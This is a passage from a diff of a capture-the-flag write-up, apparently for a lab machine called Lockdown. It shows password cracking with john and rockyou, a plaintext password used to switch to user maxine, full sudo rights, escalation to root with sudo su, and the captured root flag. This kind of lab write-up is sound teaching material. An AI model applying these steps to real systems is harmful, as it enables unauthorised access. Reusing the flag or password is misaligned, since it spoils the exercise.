@@ -175,7 +175,9 @@ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 Switching to user maxine:
 
 cyrus@lockdown:~$ su maxine
+
 Password: tiarna
+
 maxine@lockdown:~$
 
 4. Root Privileges
@@ -184,7 +186,9 @@ Sudo rights analysis for maxine:
 User maxine had full sudo rights for all commands.
 
 maxine@lockdown:~$ sudo -l
+
 User maxine may run the following commands on lockdown:
+
     (ALL : ALL) ALL
 
 
@@ -192,9 +196,13 @@ Getting root:
 By executing sudo su, root access was obtained and the final flag was captured.
 
 maxine@lockdown:~$ sudo su
+
 root@lockdown:/home/maxine# id
+
 uid=0(root) gid=0(root) groups=0(root)
+
 root@lockdown:~# cat /root/root.txt
+
 THM{IQ23Em4VGX91cvxsIzatpUvrW9GZJxm}
 
 Conclusions and Recommendations
